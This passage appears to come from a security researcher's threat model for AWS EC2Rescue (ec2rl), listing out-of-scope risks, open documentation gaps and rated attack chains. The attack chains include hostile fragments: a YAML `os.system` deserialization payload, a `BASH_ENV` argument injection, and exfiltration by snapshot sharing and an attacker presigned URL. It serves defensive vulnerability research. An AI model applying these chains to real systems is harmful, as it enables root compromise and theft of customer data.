| Local symlink/TOCTOU to root write | `/var/tmp/ec2rl` workdir | none documented `[src]` |

---

## 7. Out-of-Scope Risk Categories (state confidently)
- **Cross-tenant / multi-tenant isolation, credential vending, control-ENI reach, prompt injection, OAuth, registration/KYC, cache/authorizer, JWT** — EC2Rescue is a single-instance client tool with no tenants, no login, no LLM, no web front end. These lenses **do not fire** (see Section 8 for the null-hypothesis evidence).
- **A customer running arbitrary code as themselves** on their own instance — by design `ec2rl` runs code the operator chose; the user steering their *own* root tool is not a finding. The finding boundary is a *different*, *lower-privileged*, or *remote* actor causing that execution (supply chain, local privesc, SSM, injection).
- **Least-privilege footguns in a policy the customer authored** for `--backup`. (A weak default in an **AWS-authored** runbook policy is in scope — Area 7.)
- **IMDS existence on the managed host** per se (IMDS is expected); only the tool *using IMDSv1* is a lead (Area 5).
- **DoS from a `perfimpact` module the operator ran themselves** — single-instance self-DoS.
- **Bugs in third-party executables** a module calls (`dig`, `ps`, etc.).

---

## 8. Null hypotheses / doc gaps (pages checked)
- **Lens A/C/D(control-plane)/N (cross-tenant, vending, namespace):** N/A — read all four EC2Rescue pages + both hub pages; there is no tenant/account identifier in any interface, no resource-by-ID API, no service account hosting multiple customers. Not a managed service.
- **Lens K (prompt injection):** N/A — no LLM/agent in the pipeline (all four pages read).
- **Lens J/FF/CC/DD/BB (OAuth, JWT, upstream-context, cache, canonicalization):** N/A — no web/API front end, no authorizer, no cache, no token (pages read).
- **Lens P (registration/proofing):** N/A — no onboarding/identity-proofing flow.
- **Lens H/W (KMS/attestation):** the SSM engine **categorically refuses encrypted root volumes** (the one hard gate), so Area 6 only applies to unencrypted-root targets; `--backup` snapshot KMS handling is otherwise undocumented — confirm against source if pursued.
- **Lens L (DoS):** low — only single-instance `perfimpact`; no shared fleet.
- **Now code-confirmed (were `[src]` hypotheses):** unsafe YAML `Loader` → parse-time RCE (Area 2), `--key=value`→env/`BASH_ENV` + unquoted expansion (Area 3), unvalidated `--presigned-url` egress (Area 4), IMDSv1-first (Area 5), `0o777` + EEXIST-no-islink workdir (Area 8). These need only live PoC confirmation on a disposable instance.
- **Remaining doc/source gaps for the hunter:**
  1. The **installer script** (`install*.sh`) was not inspected — whether it enforces GPG/sha256 (vs the docs' optional manual step) is open (Area 1).
  2. Does the **SSM Distributor** install path verify package integrity equivalently? (undocumented in the runbook pages.)
  3. The engine's **log-write identity** — published min-policy has **no `s3:PutObject`** despite `S3BucketName`/`LogDestination`/`S3Prefix` (Area 7); resolve whether the automation role writes directly (confused-deputy) or a presigned URL does.
  4. Ownership/model of the **non-account-scoped `awssupport-ssm.*`** bucket and the opaque "input validation" Lambda the engine executes (Area 7, Lens EE).
  5. Whether `ExecuteEC2Rescue` **forces** backup-AMI creation (it exposes `getLinuxBackupAmi.ImageId` outputs but not the toggle).
  6. `backup.py` **volume-ID sourcing** — is `--backup=<vol-id>` constrained to attached/owned volumes, or can an arbitrary `vol-xxxx` be passed (chains Area 5 cross-volume snapshot)?

---

## 9. Kill-chain compositions (chain lenses, rate at the end of the chain)
- **Supply chain → root RCE fleet-wide:** bucket takeover/tamper (Area 1) → tampered `ec2rl.tgz` → root exec on every installing instance. **Critical.**
- **Local privesc → cross-account data exfil (strongest confirmed chain):** low-priv user pre-creates the `0o777`/symlink workdir (Area 8) → drops a `!!python/object/apply:os.system` file into the reused dir / `mod.d/` so the next **root** `ec2rl list`/`run` executes it on parse (Area 2) → root → `--backup` uses IMDSv1 instance creds (Area 5) → `CreateSnapshot` of any volume + `ModifySnapshotAttribute --add userId=<attacker-acct>` (no self-binding condition key) → full cross-account volume exfil (Area 5/7). **Critical.**
- **Argument-driven root RCE via wrapper:** a `sudo ec2rl`/SSM/support wrapper forwards lower-trust input into `--` flags → `--BASH_ENV=/tmp/evil.sh` (Area 3) sources attacker code as root. **Critical.**
- **SSM remote → arbitrary instance root-FS read:** caller with `ssm:StartAutomationExecution` on `AWSSupport-StartEC2RescueWorkflow` names a victim unencrypted-root `InstanceId`, supplies an `OfflineScript` (Area 6) → reads the mounted filesystem (secrets/keys) → exfils to a caller-chosen `S3BucketName`; no documented caller↔target ownership check. **Critical.**
- **Social-engineered presigned-url → exfil:** operator pastes attacker `--presigned-url` (Area 4) → whole diagnostic bundle (incl. `environment.yaml` secrets, `gcore` memory dumps) PUT to attacker host over plain HTTP. **High.**
```
```
